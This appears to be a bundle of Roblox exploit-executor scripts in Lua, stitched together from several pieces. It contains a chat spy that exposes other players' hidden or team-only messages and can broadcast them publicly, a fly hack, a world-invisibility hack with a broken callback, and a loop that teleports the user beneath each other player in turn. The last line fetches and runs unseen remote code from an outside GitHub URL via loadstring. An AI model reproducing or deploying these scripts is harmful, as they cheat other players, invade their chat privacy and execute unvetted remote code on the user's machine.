

enabled = true --chat "/spy" to toggle!
spyOnMyself = true --if true will check your messages too
public = false --if true will chat the logs publicly (fun, risky)
publicItalics = true --if true will use /me to stand out
privateProperties = { --customize private logs
	Color = Color3.fromRGB(0,255,255); 
	Font = Enum.Font.SourceSansBold;
	TextSize = 18;
}
 

local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
local instance = (_G.chatSpyInstance or 0) + 1
_G.chatSpyInstance = instance
 
local function onChatted(p,msg)
	if _G.chatSpyInstance == instance then
		if p==player and msg:lower():sub(1,4)=="/spy" then
			enabled = not enabled
			wait(0.3)
			privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
			StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
		elseif enabled and (spyOnMyself==true or p~=player) then
			msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
			local hidden = true
			local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
				if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
					hidden = false
				end
			end)
			wait(1)
			conn:Disconnect()
			if hidden and enabled then
				if public then
					saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
				else
					privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
				end
			end
		end
	end
end
 
for _,p in ipairs(Players:GetPlayers()) do
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end
Players.PlayerAdded:Connect(function(p)
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end)
privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
if not player.PlayerGui:FindFirstChild("Chat") then wait(3) end
local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)

local Players = game:GetService("Players")
local InputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera

local LocalPlayer = Players.LocalPlayer
local flySpeed = 3 -- Your desired fly speed

-- Helper function for safe normalization
local function safeUnit(v)
    return v.Magnitude > 0 and v.Unit or Vector3.zero
end

-- Fly function
RunService.Stepped:Connect(function(delta)
    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        return
    end

    -- Check if the player is typing in chat
    if InputService:GetFocusedTextBox() then
        -- Maintain position in the air
        LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0) -- Reset horizontal velocity
        return -- Skip movement for directional controls
    end

    -- Reset vertical velocity to prevent falling
    LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)

    -- Directional controls
    local x, y, z = 0, 0, 0

    if InputService:IsKeyDown(Enum.KeyCode.W) then
        z -= 1
    end
    if InputService:IsKeyDown(Enum.KeyCode.S) then
        z += 1
    end
    if InputService:IsKeyDown(Enum.KeyCode.D) then
        x += 1
    end
    if InputService:IsKeyDown(Enum.KeyCode.A) then
        x -= 1
    end
    --[[ If you want the player to go up and down using space and right shift remove this tag
    if InputService:IsKeyDown(Enum.KeyCode.Space) then
        y += 1
    end
    if InputService:IsKeyDown(Enum.KeyCode.LeftShift) then
        y -= 1
    end
    --]]

    -- Normalize movement direction to prevent excessive speed
    local direction = safeUnit(Camera.CFrame:VectorToWorldSpace(Vector3.new(x, 0, z)))

    -- Apply slower movement based on flySpeed, scaled for smoothness
    LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame 
        + (direction + Vector3.new(0, y, 0)) * flySpeed * delta * 0.1 -- Reduce speed scaling
end)

local function makeEverythingInvisible()
    -- Loop through all objects and make them invisible
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") then
            obj.Transparency = 1  -- Make the part invisible
            obj.CanCollide = false  -- Prevent collision with invisible parts
        end
    end

    -- Ensure your character stays visible
    local character = game.Players.LocalPlayer.Character
    if character then
        for _, part in pairs(character:GetChildren()) do
            if part:IsA("BasePart") then
                part.Transparency = 0  -- Keep your character visible
                part.CanCollide = true  -- Ensure your character can collide
            end
        end
    end

    -- Make sure other players' characters stay visible
    game.Players.PlayerAdded:Connect(function(player)
        player.CharacterAdded:Connect(function(character)
            if player ~= game.Players.LocalPlayer then
                for _, part in pairs(character:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.Transparency = 0  -- Keep other players' characters visible
                        part.CanCollide = true  -- Ensure collision for other players
                    end
                end
            end
        end)
    end)

    print("[ðŸ’¨ Everything Invisible | Players Visible]")
end

makeEverythingInvisible()

-- Listen for respawn and trigger the function
LocalPlayer.CharacterAdded:Connect(onCharacterAdded)


local Players = game:GetService("Players")
local player = Players.LocalPlayer

if player and player.Character then
    player.CameraMode = Enum.CameraMode.Classic
    player.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Invisicam
end

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local hrp = Character:WaitForChild("HumanoidRootPart")

local targetPlayer = nil -- Current player to follow

-- Function to smoothly follow under a player
local function followUnderPlayer()
    RunService.RenderStepped:Connect(function()
        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") and hrp then
            local targetHRP = targetPlayer.Character.HumanoidRootPart
            -- Keep position directly below target at -15 on Y-axis
            hrp.CFrame = targetHRP.CFrame * CFrame.new(0, -15, 0)
        end
    end)
end

-- Function to update the local player's character (handles respawn)
local function onCharacterAdded(newCharacter)
    Character = newCharacter
    hrp = Character:WaitForChild("HumanoidRootPart") -- Get new HumanoidRootPart
    followUnderPlayer() -- Restart floating under player
end

-- Loop through players and update target every 2 seconds
spawn(function()
    while true do
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                targetPlayer = player
                wait(1) -- Switch player every 2 seconds
            end
        end
    end
end)

-- Listen for respawns and update character
LocalPlayer.CharacterAdded:Connect(onCharacterAdded)


-- Start following under players
followUnderPlayer()

loadstring(game:HttpGet("https://raw.githubusercontent.com/faisal31312/elemental/refs/heads/main/elemental"))()
